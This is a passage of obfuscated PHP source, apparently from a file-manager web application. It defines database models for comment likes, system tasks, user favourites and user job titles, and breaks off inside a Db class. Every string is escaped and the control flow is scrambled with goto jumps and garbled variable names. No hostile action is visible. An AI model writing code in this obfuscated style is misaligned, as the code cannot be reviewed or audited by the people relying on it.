$bÏ­œ—âçØ = array($bñ‡ˆòõ©[482] => array($bñ‡ˆòõ©[7], $eÅ‹ØåÏ‘ò), $bñ‡ˆòõ©[402] => $c˜­Êã¡¾Å); $c«³ÒÕøÊ‡ = $this->field($DšÒë–à¦)->where($bÏ­œ—âçØ)->group($bñ‡ˆòõ©[482])->select(); goto fºâöê»…Ô; dÇããÈİÄ: $bñ‡ˆòõ© =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$eÅ‹ØåÏ‘ò) { return array(); } if (is_string($eÅ‹ØåÏ‘ò) || is_int($eÅ‹ØåÏ‘ò)) { $eÅ‹ØåÏ‘ò = array($eÅ‹ØåÏ‘ò); } goto A‘ÀÃö£ˆÌ; fºâöê»…Ô: return array_to_keyvalue($c«³ÒÕøÊ‡, $bñ‡ˆòõ©[482], $bñ‡ˆòõ©[478]); goto eâùŞïİÕ; eâùŞïİÕ: } public function remove($d”»ÉòçÅ²) { $D²éĞ² =& $_SERVER[Ïº«‚ßèÔˆø]; $DØÊ¾óùÁó = array($D²éĞ²[1700] => $d”»ÉòçÅ²); $dêƒÌøœª„ = $this->where($DØÊ¾óùÁó)->find(); if ($dêƒÌøœª„[$D²éĞ²[1699]]) { $this->where(array($D²éĞ²[1700] => $dêƒÌøœª„[$D²éĞ²[1699]]))->setAdd($D²éĞ²[1701], -1); } return $this->where($DØÊ¾óùÁó)->delete(); } public function edit($f„ŠÜ‹†±ã, $AÉƒê›) { $AŒ´Ñ• °‚ =& $_SERVER[Ïº«‚ßèÔˆø]; $Aå„¢ãçã = array($AŒ´Ñ• °‚[1700] => $f„ŠÜ‹†±ã); return $this->where($Aå„¢ãçã)->save(array($AŒ´Ñ• °‚[1704] => $AÉƒê›)); } public function prasise($D•­‹„Şê) { $cãìîÁ´Á® =& $_SERVER[Ïº«‚ßèÔˆø]; $dÎØ ¸¾… = Model($cãìîÁ´Á®[1705]); $C‹ˆ¤¢¸’° = array($cãìîÁ´Á®[1700] => $D•­‹„Şê, $cãìîÁ´Á®[1500] => USER_ID); $a‹×¦ŸŸÈê = $dÎØ ¸¾…->where($C‹ˆ¤¢¸’°)->find(); if (!$a‹×¦ŸŸÈê) { $dÎØ ¸¾…->add($C‹ˆ¤¢¸’°); $B®‰“ªÓù = $this->where(array($cãìîÁ´Á®[1700] => $D•­‹„Şê))->setAdd($cãìîÁ´Á®[1702], 1); } else { $dÎØ ¸¾…->where($C‹ˆ¤¢¸’°)->delete(); $B®‰“ªÓù = $this->where(array($cãìîÁ´Á®[1700] => $D•­‹„Şê))->setAdd($cãìîÁ´Á®[1702], -1); } return $B®‰“ªÓù; } public function targetInfo($DæÅİË†¸á, $C¡ªèá¥Ÿä) { goto d¢»†²Û‘Ğ; d¢»†²Û‘Ğ: $D°¼³¦­ =& $_SERVER[Ïº«‚ßèÔˆø]; $C´¶â‹™ö = array($D°¼³¦­[548] => $DæÅİË†¸á, $D°¼³¦­[549] => $C¡ªèá¥Ÿä); $CÖğ–Ô”ºÕ = $this->where($C´¶â‹™ö)->count(); goto F“¯«ğÎ‘; F“¯«ğÎ‘: $D–Ü“Á…²ì = "\122\111\x47\x48\124\x20\112\x4f\111\116\40{$this->tablePrefix}\x63\157\x6d\x6d\145\x6e\x74\137\x70\162\141\x69\163\x65\x20\163\164\141\162\40\157\x6e\x20\x63\x6f\155\x6d\145\156\x74\56\x63\x6f\155\155\145\156\164\x49\104\x20\x3d\x20\163\164\141\x72\56\x63\x6f\x6d\x6d\x65\156\164\x49\x44"; $dÙíˆ‹åôø = $this->alias($D°¼³¦­[351])->where($C´¶â‹™ö)->join($D–Ü“Á…²ì, $D°¼³¦­[1706])->count(); $C¢¸½Ùƒ‰ª = array($D°¼³¦­[1707] => $CÖğ–Ô”ºÕ, $D°¼³¦­[1708] => $dÙíˆ‹åôø); goto f„Ë¤²”ƒ²; f„Ë¤²”ƒ²: return $C¢¸½Ùƒ‰ª; goto cÆíÈÅ¶¼; cÆíÈÅ¶¼: } public function listData($eÆá¡ˆ°¨Š) { $E†Ñ¥ŠØÀÁ =& $_SERVER[Ïº«‚ßèÔˆø]; if (isset($eÆá¡ˆ°¨Š[$E†Ñ¥ŠØÀÁ[1709]])) { if ($eÆá¡ˆ°¨Š[$E†Ñ¥ŠØÀÁ[1709]]) { $eÆá¡ˆ°¨Š[$E†Ñ¥ŠØÀÁ[1710]] = array($E†Ñ¥ŠØÀÁ[955], intval($eÆá¡ˆ°¨Š[$E†Ñ¥ŠØÀÁ[1709]])); } unset($eÆá¡ˆ°¨Š[$E†Ñ¥ŠØÀÁ[1709]]); } if (isset($eÆá¡ˆ°¨Š[$E†Ñ¥ŠØÀÁ[1711]])) { if ($eÆá¡ˆ°¨Š[$E†Ñ¥ŠØÀÁ[1711]]) { $eÆá¡ˆ°¨Š[$E†Ñ¥ŠØÀÁ[1710]] = array($E†Ñ¥ŠØÀÁ[952], intval($eÆá¡ˆ°¨Š[$E†Ñ¥ŠØÀÁ[1711]])); } unset($eÆá¡ˆ°¨Š[$E†Ñ¥ŠØÀÁ[1711]]); } return $this->_listData($eÆá¡ˆ°¨Š); } private function _listData($Eá•‰»Áªè) { $ašÂºğ§ã =& $_SERVER[Ïº«‚ßèÔˆø]; $e ‹×Á‚óÜ = $this->where($Eá•‰»Áªè)->_makeOrder()->selectPage(100); $this->_listAppendParent($e ‹×Á‚óÜ[$ašÂºğ§ã[366]]); $this->_listAppendUser($e ‹×Á‚óÜ[$ašÂºğ§ã[366]]); $this->_listAppendMeta($e ‹×Á‚óÜ[$ašÂºğ§ã[366]]); return $e ‹×Á‚óÜ; } private function _makeOrder() { $BññÂˆ©Ï° =& $_SERVER[Ïº«‚ßèÔˆø]; $CìÅŠÊ­×ğ = array($BññÂˆ©Ï°[1702], $BññÂˆ©Ï°[1701], $BññÂˆ©Ï°[193]); $bèÈ«Ğ¹ôÏ = Input::get($BññÂˆ©Ï°[433], $BññÂˆ©Ï°[7], $BññÂˆ©Ï°[414], $CìÅŠÊ­×ğ); $c–ØŠ©œ¤˜ = Input::get($BññÂˆ©Ï°[434], $BññÂˆ©Ï°[7], $BññÂˆ©Ï°[1502], array($BññÂˆ©Ï°[1712], $BññÂˆ©Ï°[429])); $f²Ö–Ã¶§  = $bèÈ«Ğ¹ôÏ . $BññÂˆ©Ï°[50] . $c–ØŠ©œ¤˜; return $this->order($f²Ö–Ã¶§ ); } private function _listAppendParent(&$dÆ£„µÅÏ‹) { goto Fà‚˜¯ŞÅ; Fà‚˜¯ŞÅ: $dà³·¢Ş’ =& $_SERVER[Ïº«‚ßèÔˆø]; $eãåÊ°½¢É = array_unique(array_to_keyvalue($dÆ£„µÅÏ‹, $dà³·¢Ş’[33], $dà³·¢Ş’[1699])); $eãåÊ°½¢É = array_remove_value($eãåÊ°½¢É, $dà³·¢Ş’[495]); goto EƒöãÀ®óî; EƒöãÀ®óî: if (!$eãåÊ°½¢É) { return; } $CŒ¨µµ‡¶¥ = $this->where(array($dà³·¢Ş’[1700] => array($dà³·¢Ş’[7], $eãåÊ°½¢É)))->select(); $CŒ¨µµ‡¶¥ = array_to_keyvalue($CŒ¨µµ‡¶¥, $dà³·¢Ş’[1710]); goto a‡õàÉóå; a‡õàÉóå: foreach ($dÆ£„µÅÏ‹ as &$e‹“ÍƒÚ¡Ì) { if (isset($CŒ¨µµ‡¶¥[$e‹“ÍƒÚ¡Ì[$dà³·¢Ş’[1699]]])) { $e‹“ÍƒÚ¡Ì[$dà³·¢Ş’[1713]] = $CŒ¨µµ‡¶¥[$e‹“ÍƒÚ¡Ì[$dà³·¢Ş’[1699]]]; } } unset($e‹“ÍƒÚ¡Ì); goto EäËš‘§‚; EäËš‘§‚: } private function _listAppendUser(&$BˆíàÂäñ) { goto dÚ¹¤”¿¢Ù; A’»‹Ü±ã¹: if (count($D‘Œ’Ïªßˆ) == 0) { return; } foreach ($BˆíàÂäñ as $CæÎÇÁ°Â) { if (isset($CæÎÇÁ°Â[$Béõïïºí[1713]])) { $D‘Œ’Ïªßˆ[] = $CæÎÇÁ°Â[$Béõïïºí[1713]][$Béõïïºí[1508]]; } } $cåÖÁĞ ø = Model($Béõïïºí[505])->userListInfo($D‘Œ’Ïªßˆ); goto c¥ÇÜô«¢; dÚ¹¤”¿¢Ù: $Béõïïºí =& $_SERVER[Ïº«‚ßèÔˆø]; $D‘Œ’Ïªßˆ = array_unique(array_to_keyvalue($BˆíàÂäñ, $Béõïïºí[33], $Béõïïºí[1508])); $D‘Œ’Ïªßˆ = array_remove_value($D‘Œ’Ïªßˆ, $Béõïïºí[495]); goto A’»‹Ü±ã¹; c¥ÇÜô«¢: foreach ($BˆíàÂäñ as &$CæÎÇÁ°Â) { $CæÎÇÁ°Â[$Béõïïºí[561]] = $cåÖÁĞ ø[$CæÎÇÁ°Â[$Béõïïºí[1508]]]; if (isset($CæÎÇÁ°Â[$Béõïïºí[1713]])) { $CæÎÇÁ°Â[$Béõïïºí[1713]][$Béõïïºí[561]] = $cåÖÁĞ ø[$CæÎÇÁ°Â[$Béõïïºí[1713]][$Béõïïºí[1508]]]; } } unset($CæÎÇÁ°Â); goto C²ƒÃ‰é—; C²ƒÃ‰é—: } private function _listAppendMeta(&$D‡…ñëŒê”) { goto bÏŞáÏäáğ; Dø¦‰›¦ÒÁ: if (!$eïßŒĞäÁ) { return !1; } foreach ($D‡…ñëŒê” as &$CÁŒ£­­”“) { $CÁŒ£­­”“[$eõ¡ÒÊ‡Î[443]] = $eïßŒĞäÁ[$CÁŒ£­­”“[$eõ¡ÒÊ‡Î[1710]]]; if (isset($CÁŒ£­­”“[$eõ¡ÒÊ‡Î[1713]])) { $CÁŒ£­­”“[$eõ¡ÒÊ‡Î[1713]][$eõ¡ÒÊ‡Î[443]] = $eïßŒĞäÁ[$CÁŒ£­­”“[$eõ¡ÒÊ‡Î[1713]][$eõ¡ÒÊ‡Î[1710]]]; } } unset($CÁŒ£­­”“); goto dÓ×Ş°¯‚¬; bÏŞáÏäáğ: $eõ¡ÒÊ‡Î =& $_SERVER[Ïº«‚ßèÔˆø]; $Cµè¨µ‰ÆŞ = array_unique(array_to_keyvalue($D‡…ñëŒê”, $eõ¡ÒÊ‡Î[33], $eõ¡ÒÊ‡Î[1710])); $Cµè¨µ‰ÆŞ = array_remove_value($Cµè¨µ‰ÆŞ, $eõ¡ÒÊ‡Î[495]); goto e»Ô¤­™ÙÚ; e»Ô¤­™ÙÚ: if (!$Cµè¨µ‰ÆŞ) { return; } foreach ($D‡…ñëŒê” as $CÁŒ£­­”“) { if (isset($CÁŒ£­­”“[$eõ¡ÒÊ‡Î[1713]])) { $Cµè¨µ‰ÆŞ[] = $CÁŒ£­­”“[$eõ¡ÒÊ‡Î[1713]][$eõ¡ÒÊ‡Î[1710]]; } } $eïßŒĞäÁ = $this->metaList($Cµè¨µ‰ÆŞ); goto Dø¦‰›¦ÒÁ; dÓ×Ş°¯‚¬: } private function metaList($D‘ùŒøÖ¹³) { goto Cô‚¥ïŒà™; E½ÑÊ‘³ô: return $E¡ó»›Îùİ ? $E¡ó»›Îùİ : array(); goto f…õóó½ì¯; Cô‚¥ïŒà™: $B–¶Ö‰°”Î =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$D‘ùŒøÖ¹³) { return array(); } $fïî…ì”ì© = array($B–¶Ö‰°”Î[1710] => array($B–¶Ö‰°”Î[7], $D‘ùŒøÖ¹³)); goto AèÄ’š´†; AèÄ’š´†: $E¡ó»›Îùİ = Model($B–¶Ö‰°”Î[1714])->where($fïî…ì”ì©)->select(); $E¡ó»›Îùİ = array_to_keyvalue_group($E¡ó»›Îùİ, $B–¶Ö‰°”Î[1710]); foreach ($E¡ó»›Îùİ as $eï´Õò’–„ => $EƒÙå•Ù±) { $bã§Øœ×¾á = array(); foreach ($EƒÙå•Ù± as $a ƒƒªŸ¨) { $bã§Øœ×¾á[$a ƒƒªŸ¨[$B–¶Ö‰°”Î[93]]] = $a ƒƒªŸ¨[$B–¶Ö‰°”Î[371]]; } $E¡ó»›Îùİ[$eï´Õò’–„] = $bã§Øœ×¾á; } goto E½ÑÊ‘³ô; f…õóó½ì¯: } } goto eÄÔ¿Ò£Ä; fÔÎ¹Òä®”: class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\155\56\164\x61\x73\153\x4c\x69\x73\x74"; public $field = array("\x6e\141\155\x65", "\164\x79\x70\145", "\x65\166\x65\156\164", "\164\x69\155\145", "\x64\145\163\x63", "\x73\171\x73\164\x65\155", "\145\x6e\x61\x62\154\145", "\154\141\163\x74\122\x75\x6e", "\163\x6f\162\164"); public function listData($f’˜ÒãóÛ° = false, $Eäª¿ÚĞÊ = "\x73\x6f\162\164", $B›„ÆÆÃè­ = false) { return parent::listData($f’˜ÒãóÛ°, $Eäª¿ÚĞÊ, $B›„ÆÆÃè­); } public function add($då‰½ìœåÏ) { $B¦¢Ü­³¼Ç =& $_SERVER[Ïº«‚ßèÔˆø]; $fÄ„Şè = $this->findByName($då‰½ìœåÏ[$B¦¢Ü­³¼Ç[28]]); if ($fÄ„Şè) { return !1; } $då‰½ìœåÏ[$B¦¢Ü­³¼Ç[1473]] = 0; $då‰½ìœåÏ[$B¦¢Ü­³¼Ç[1694]] = $this->getSort(); return parent::insert($då‰½ìœåÏ); } private function getSort() { $aø«ÓÙ»¾¡ =& $_SERVER[Ïº«‚ßèÔˆø]; $DÒ“®äÄ = parent::listData(); $d†áóÄÓ¿Ú = array_to_keyvalue($DÒ“®äÄ, $aø«ÓÙ»¾¡[33], $aø«ÓÙ»¾¡[1694]); return empty($d†áóÄÓ¿Ú) ? 0 : max($d†áóÄÓ¿Ú) + 1; } public function update($EİØ¿ÏÑ, $EŠÇœç«©) { $E¨Ğ½ÔñåÖ =& $_SERVER[Ïº«‚ßèÔˆø]; $a»¨ŞòË· = $this->listData($EİØ¿ÏÑ); $E²Ü¸¨‚“å = $this->findByName($EŠÇœç«©[$E¨Ğ½ÔñåÖ[28]]); if (!$a»¨ŞòË· || $E²Ü¸¨‚“å && $E²Ü¸¨‚“å[$E¨Ğ½ÔñåÖ[392]] != $a»¨ŞòË·[$E¨Ğ½ÔñåÖ[392]]) { return !1; } return parent::update($EİØ¿ÏÑ, $EŠÇœç«©); } public function remove($déÈª¼šÇ, $fï‡Ú‘è = false) { $dÆµ†å‚“ƒ =& $_SERVER[Ïº«‚ßèÔˆø]; $cˆŒÉåè£Ş = $this->listData($déÈª¼šÇ); if (!$cˆŒÉåè£Ş) { return; } if (!$fï‡Ú‘è && $cˆŒÉåè£Ş[$dÆµ†å‚“ƒ[1152]] == $dÆµ†å‚“ƒ[87]) { return !1; } return parent::remove($déÈª¼šÇ); } public function enable($EØÑå·†¥, $f÷ÅÔšÑ¨ˆ) { return $this->update($EØÑå·†¥, array($_SERVER[Ïº«‚ßèÔˆø][2079] => $f÷ÅÔšÑ¨ˆ)); } public function run($eíã°¹ª¢ ) { return $this->update($eíã°¹ª¢ , array($_SERVER[Ïº«‚ßèÔˆø][2089] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\163\145\x72\137\x66\141\x76"; protected function cacheFunctionAlias($CÂÃñÙ‘ªÙ) { $aÆ Ú„¡Õ£ =& $_SERVER[Ïº«‚ßèÔˆø]; return array($aÆ Ú„¡Õ£[1773] => array(USER_ID, $aÆ Ú„¡Õ£[2090])); } protected function listData() { $Díî¿ƒİ  =& $_SERVER[Ïº«‚ßèÔˆø]; $cĞÖ²ÕÑê = array($Díî¿ƒİ [1500] => USER_ID, $Díî¿ƒİ [461] => 0); $C½˜Ğá = $Díî¿ƒİ [2091]; $B©ßèàŸ‰ = $this->field($C½˜Ğá)->where($cĞÖ²ÕÑê)->order($Díî¿ƒİ [2092])->select(); return $B©ßèàŸ‰ ? $B©ßèàŸ‰ : array(); } protected function resetCache() { } protected function listView() { goto fî°„æ“‚Ï; f¡¶›Ëù“’: $E¾ø²ëÌª¹ = array_to_keyvalue($E‚×áÛÂ‚, $E¡†¯ÂƒŒ…[33], $E¡†¯ÂƒŒ…[76]); if (!$E¾ø²ëÌª¹) { return $b×õã–¬³ß; } $EÄ÷øƒêª› = 2000; goto CäØ¡ÆÖ; CäØ¡ÆÖ: $aê¦äµ‹ = array($E¡†¯ÂƒŒ…[408] => array($E¡†¯ÂƒŒ…[409], $E¾ø²ëÌª¹)); $a¸ê˜ç‰Êô = Model($E¡†¯ÂƒŒ…[782])->listSource($aê¦äµ‹, $EÄ÷øƒêª›); $a¸ê˜ç‰Êô = array_merge($a¸ê˜ç‰Êô[$E¡†¯ÂƒŒ…[74]], $a¸ê˜ç‰Êô[$E¡†¯ÂƒŒ…[75]]); goto dÒ”óâ«ªó; dÒ”óâ«ªó: $a¸ê˜ç‰Êô = array_to_keyvalue($a¸ê˜ç‰Êô, $E¡†¯ÂƒŒ…[394]); foreach ($b×õã–¬³ß as $e•Í¨Ôæ¥ˆ => $FÓãŒå´ñ¹) { $eëñ„ÈªİÍ = $a¸ê˜ç‰Êô[$FÓãŒå´ñ¹[$E¡†¯ÂƒŒ…[76]]]; $eëñ„ÈªİÍ = $eëñ„ÈªİÍ ? $eëñ„ÈªİÍ : array(); $b×õã–¬³ß[$e•Í¨Ôæ¥ˆ] = array_merge($eëñ„ÈªİÍ, $FÓãŒå´ñ¹); } return $b×õã–¬³ß; goto dˆµË¸¡Àª; fî°„æ“‚Ï: $E¡†¯ÂƒŒ… =& $_SERVER[Ïº«‚ßèÔˆø]; $b×õã–¬³ß = $this->listData(); $E‚×áÛÂ‚ = array_filter_by_field($b×õã–¬³ß, $E¡†¯ÂƒŒ…[29], $E¡†¯ÂƒŒ…[407]); goto f¡¶›Ëù“’; dˆµË¸¡Àª: } protected function addFav($C‡õŸî Æ, $c±‡ÜÇ® = '', $AŸóëË™» = "\163\x6f\165\x72\x63\x65") { goto b‘²Óåãœâ; eƒ†“Š¨¼±: if (!$c±‡ÜÇ® && $AŸóëË™» == $AÖ‹ˆÖñº’[407]) { $e‚„•„øù = Model($AÖ‹ˆÖñº’[1187])->where(array($AÖ‹ˆÖñº’[408] => $C‡õŸî Æ))->find(); if (!$e‚„•„øù) { return !1; } $c±‡ÜÇ® = $e‚„•„øù[$AÖ‹ˆÖñº’[28]]; } $c±‡ÜÇ® = $this->getAutoName($c±‡ÜÇ®); $eäœĞíÍ = array($AÖ‹ˆÖñº’[1500] => USER_ID, $AÖ‹ˆÖñº’[461] => 0, $AÖ‹ˆÖñº’[411] => $c±‡ÜÇ®, $AÖ‹ˆÖñº’[412] => $C‡õŸî Æ, $AÖ‹ˆÖñº’[413] => $AŸóëË™», $AÖ‹ˆÖñº’[1675] => $aô±ˆìÍ›Ì + 1); goto a‹‹˜°ƒôõ; a‹‹˜°ƒôõ: return $this->add($eäœĞíÍ); goto C…ö¯¯›”; b‘²Óåãœâ: $AÖ‹ˆÖñº’ =& $_SERVER[Ïº«‚ßèÔˆø]; $e½êµÒ¼ë = array($AÖ‹ˆÖñº’[1500] => USER_ID, $AÖ‹ˆÖñº’[461] => 0, $AÖ‹ˆÖñº’[413] => $AŸóëË™», $AÖ‹ˆÖñº’[412] => $C‡õŸî Æ); if ($this->where($e½êµÒ¼ë)->find()) { return !1; } goto b†Ö¼ˆ°Œª; b†Ö¼ˆ°Œª: $e½êµÒ¼ë = array($AÖ‹ˆÖñº’[1500] => USER_ID, $AÖ‹ˆÖñº’[461] => 0); $aô±ˆìÍ›Ì = $this->where($e½êµÒ¼ë)->max($AÖ‹ˆÖñº’[1694]); if (!$aô±ˆìÍ›Ì) { $aô±ˆìÍ›Ì = 0; } goto eƒ†“Š¨¼±; C…ö¯¯›”: } protected function remove($f¨»Ë«ƒ«) { $FÒÍóí×‰Æ =& $_SERVER[Ïº«‚ßèÔˆø]; $e¥’œŞã¹ = array($FÒÍóí×‰Æ[1500] => USER_ID, $FÒÍóí×‰Æ[410] => $f¨»Ë«ƒ«); return $this->where($e¥’œŞã¹)->delete(); } protected function removeByName($C‹Ô˜•ñİ¡) { $bÔ´Ø‡™§ñ =& $_SERVER[Ïº«‚ßèÔˆø]; $A²×îª±‰˜ = array($bÔ´Ø‡™§ñ[1500] => USER_ID, $bÔ´Ø‡™§ñ[411] => $C‹Ô˜•ñİ¡, $bÔ´Ø‡™§ñ[461] => 0); return $this->where($A²×îª±‰˜)->delete(); } protected function rename($b¡ˆÅÆøÓ, $fÖ‹®°ìß) { $f°Š‘¦…Á =& $_SERVER[Ïº«‚ßèÔˆø]; if ($b¡ˆÅÆøÓ == $fÖ‹®°ìß) { return !1; } $dÂÕ­Ì›©‘ = $this->getAutoName($fÖ‹®°ìß); if ($fÖ‹®°ìß != $dÂÕ­Ì›©‘) { return !1; } $añÙã„‡¥ë = array($f°Š‘¦…Á[1500] => USER_ID, $f°Š‘¦…Á[461] => 0, $f°Š‘¦…Á[28] => $b¡ˆÅÆøÓ); return $this->where($añÙã„‡¥ë)->save(array($f°Š‘¦…Á[28] => $fÖ‹®°ìß)); } protected function resetSort($eÌ¦‡¾¤âÉ) { $CƒçÙÌ”œ‡ =& $_SERVER[Ïº«‚ßèÔˆø]; $eÌ¦‡¾¤âÉ = is_array($eÌ¦‡¾¤âÉ) ? $eÌ¦‡¾¤âÉ : array(); $FÕğê¶“ Š = array($CƒçÙÌ”œ‡[1500] => USER_ID); for ($BÎäìõéªÏ = 0; $BÎäìõéªÏ < count($eÌ¦‡¾¤âÉ); $BÎäìõéªÏ++) { $FÕğê¶“ Š[$CƒçÙÌ”œ‡[410]] = $eÌ¦‡¾¤âÉ[$BÎäìõéªÏ]; $this->where($FÕğê¶“ Š)->save(array($CƒçÙÌ”œ‡[1675] => $BÎäìõéªÏ + 1)); } return !0; } protected function moveTop($E®ƒùâ˜÷) { goto dîÕ¯‚¥Ú¦; d²‰¨š³‘â: $c‹Ú±ÅÁ‘Ú = $a‚Ê¹Ç¹­Ê; $a‚Ê¹Ç¹­Ê = array_remove_value($a‚Ê¹Ç¹­Ê, $b…©—Ÿ‡»¢[$c­àŞ‰Øˆƒ[392]]); array_unshift($a‚Ê¹Ç¹­Ê, $b…©—Ÿ‡»¢[$c­àŞ‰Øˆƒ[392]]); goto d£éÇ„à²; d£éÇ„à²: return $this->resetSort($a‚Ê¹Ç¹­Ê); goto D§ÓÎÑÊÜñ; dîÕ¯‚¥Ú¦: $c­àŞ‰Øˆƒ =& $_SERVER[Ïº«‚ßèÔˆø]; $f ‰è¼…Åö = array($c­àŞ‰Øˆƒ[1500] => USER_ID, $c­àŞ‰Øˆƒ[461] => 0); $b…©—Ÿ‡»¢ = $this->where($f ‰è¼…Åö)->where(array($c­àŞ‰Øˆƒ[28] => $E®ƒùâ˜÷))->find(); goto cØÃ‘¡Æ²; cØÃ‘¡Æ²: if (!$b…©—Ÿ‡»¢) { return; } $a‚Ê¹Ç¹­Ê = $this->field($c­àŞ‰Øˆƒ[392])->where($f ‰è¼…Åö)->order($c­àŞ‰Øˆƒ[2092])->select(); $a‚Ê¹Ç¹­Ê = array_to_keyvalue($a‚Ê¹Ç¹­Ê, $c­àŞ‰Øˆƒ[33], $c­àŞ‰Øˆƒ[392]); goto d²‰¨š³‘â; D§ÓÎÑÊÜñ: } protected function moveBottom($fÜÇÑŠì™İ) { $F×ÏöÒÛÄ =& $_SERVER[Ïº«‚ßèÔˆø]; $Fİ§°º˜ÁÛ = array($F×ÏöÒÛÄ[1500] => USER_ID, $F×ÏöÒÛÄ[461] => 0); $E§‘¨¨À = $this->where($Fİ§°º˜ÁÛ)->max($F×ÏöÒÛÄ[1694]); $e§…„ÙÙ”¯ = array($F×ÏöÒÛÄ[1694] => $E§‘¨¨À + 1); return $this->where($Fİ§°º˜ÁÛ)->where(array($F×ÏöÒÛÄ[28] => $fÜÇÑŠì™İ))->save($e§…„ÙÙ”¯); } private function getAutoName($CÍ† áù–) { goto aôÜŒôåùê; dñÀ™ôç©õ: return $CÍ† áù– . "\x28{$A¬„µµÇÏò}\x29"; goto CöØ¸¾ãå×; F¬ñ÷‚ïñ¦: $Cˆ¹ÄØ¨ƒ = array_to_keyvalue($Cˆ¹ÄØ¨ƒ, $E¾‹¹¨»ïó[33], $E¾‹¹¨»ïó[28]); if (!$Cˆ¹ÄØ¨ƒ || !in_array($CÍ† áù–, $Cˆ¹ÄØ¨ƒ)) { return $CÍ† áù–; } for ($A¬„µµÇÏò = 0; $A¬„µµÇÏò < count($Cˆ¹ÄØ¨ƒ); $A¬„µµÇÏò++) { if (!in_array($CÍ† áù– . "\x28{$A¬„µµÇÏò}\51", $Cˆ¹ÄØ¨ƒ)) { return $CÍ† áù– . "\50{$A¬„µµÇÏò}\51"; } } goto dñÀ™ôç©õ; aôÜŒôåùê: $E¾‹¹¨»ïó =& $_SERVER[Ïº«‚ßèÔˆø]; $fÄÖùÙ£ë = array($E¾‹¹¨»ïó[1500] => USER_ID, $E¾‹¹¨»ïó[461] => 0); $Cˆ¹ÄØ¨ƒ = $this->field($E¾‹¹¨»ïó[28])->where($fÄÖùÙ£ë)->select(); goto F¬ñ÷‚ïñ¦; CöØ¸¾ãå×: } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\155\x2e\152\157\142\114\x69\163\x74"; public $field = array("\156\141\x6d\145", "\x64\145\x73\143", "\163\157\162\164"); const JOB_KEY = "\163\x65\154\146\x4a\157\142\x4c\x69\163\164"; public function listData($b¡ˆˆÔ‚ˆƒ = false, $e…åÁ£šÑ = "\163\x6f\x72\x74", $c…Û“™¸äÎ = false) { return parent::listData($b¡ˆˆÔ‚ˆƒ, $e…åÁ£šÑ, $c…Û“™¸äÎ); } public function remove($D¼ÃÓŒ¤µï) { return parent::remove($D¼ÃÓŒ¤µï); } public function add($añÇŸè©–) { $cÊš‚×Ê¼ˆ =& $_SERVER[Ïº«‚ßèÔˆø]; if ($this->findByName($añÇŸè©–[$cÊš‚×Ê¼ˆ[28]])) { return !1; } $añÇŸè©–[$cÊš‚×Ê¼ˆ[1694]] = $this->getSort(); return parent::insert($añÇŸè©–); } private function getSort() { $bÑéÄªøš“ =& $_SERVER[Ïº«‚ßèÔˆø]; $eÚ„Ûè© = parent::listData(); $c©ÙƒœòŒá = array_to_keyvalue($eÚ„Ûè©, $bÑéÄªøš“[33], $bÑéÄªøš“[1694]); return empty($c©ÙƒœòŒá) ? 0 : max($c©ÙƒœòŒá) + 1; } public function update($Dä´Ã‹äÙ, $E÷˜³´Ç‡Ê) { $d³ø…å‡œ =& $_SERVER[Ïº«‚ßèÔˆø]; $f”›¾éà = parent::listData($Dä´Ã‹äÙ); $D¾ÃñÏğŞ¬ = $this->findByName($E÷˜³´Ç‡Ê[$d³ø…å‡œ[28]]); if (!$f”›¾éà || $D¾ÃñÏğŞ¬ && $D¾ÃñÏğŞ¬[$d³ø…å‡œ[392]] != $f”›¾éà[$d³ø…å‡œ[392]]) { return !1; } return parent::update($Dä´Ã‹äÙ, $E÷˜³´Ç‡Ê); } public function setUserJob($Eªø§öºó, $c«ÈÃ„ ™ˆ) { goto C“¨„Ê¾ÖØ; C“¨„Ê¾ÖØ: $fŞø²Èº¦ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!is_array($c«ÈÃ„ ™ˆ)) { $c«ÈÃ„ ™ˆ = array($c«ÈÃ„ ™ˆ); } $fŞç·ƒ÷Ü² = parent::listData(); goto Bøœ–²ºô; B¨¡å”à: $CÆ›°‚šÍò = rtrim($CÆ›°‚šÍò, $fŞø²Èº¦[47]); Model($fŞø²Èº¦[505])->metaSet($Eªø§öºó, self::JOB_KEY, $CÆ›°‚šÍò); goto dß—ØŠŠ‹—; Bøœ–²ºô: $c´‰ÆÙÄ¨ù = array_to_keyvalue($fŞç·ƒ÷Ü², $fŞø²Èº¦[28]); $CÆ›°‚šÍò = $fŞø²Èº¦[374]; foreach ($c«ÈÃ„ ™ˆ as $A’Ï¯Ø…Ò›) { if ($c´‰ÆÙÄ¨ù[$A’Ï¯Ø…Ò›]) { $CÆ›°‚šÍò .= $c´‰ÆÙÄ¨ù[$A’Ï¯Ø…Ò›][$fŞø²Èº¦[392]] . $fŞø²Èº¦[47]; } else { $d–İêë™•‰ = $this->add($A’Ï¯Ø…Ò›); $CÆ›°‚šÍò .= $d–İêë™•‰ . $fŞø²Èº¦[47]; } } goto B¨¡å”à; dß—ØŠŠ‹—: } public function getUserJob($EĞÖ·Ç½«•) { $b÷¬õßÖéğ = Model($_SERVER[Ïº«‚ßèÔˆø][505])->metaGet($EĞÖ·Ç½«•); return $this->getUserJobInfo($b÷¬õßÖéğ[self::JOB_KEY]); } public function getUserJobInfo($bÌ“Ú„äë”) { goto cŸÂ ³êº»; cŸÂ ³êº»: $fİ¢©¿İèê =& $_SERVER[Ïº«‚ßèÔˆø]; $Bßê¸òç¤Á = explode($fİ¢©¿İèê[47], $bÌ“Ú„äë”); $A’”‚Æï¡ = parent::listData(); goto b´†Ğø òœ; b´†Ğø òœ: $A’”‚Æï¡ = array_remove_key($A’”‚Æï¡, $fİ¢©¿İèê[193]); $a¢îÙ£´• = array(); foreach ($Bßê¸òç¤Á as $f§Í…”‚®) { if (isset($A’”‚Æï¡[$f§Í…”‚®])) { $a¢îÙ£´•[] = $A’”‚Æï¡[$f§Í…”‚®]; } } goto b¾†ëÜÉ; b¾†ëÜÉ: return $a¢îÙ£´•; goto bÜšàÜ‘Ï; bÜšàÜ‘Ï: } } goto b¢šÔºœ“; cÁ«©ó×‘: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\x68\x69\x6e\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = 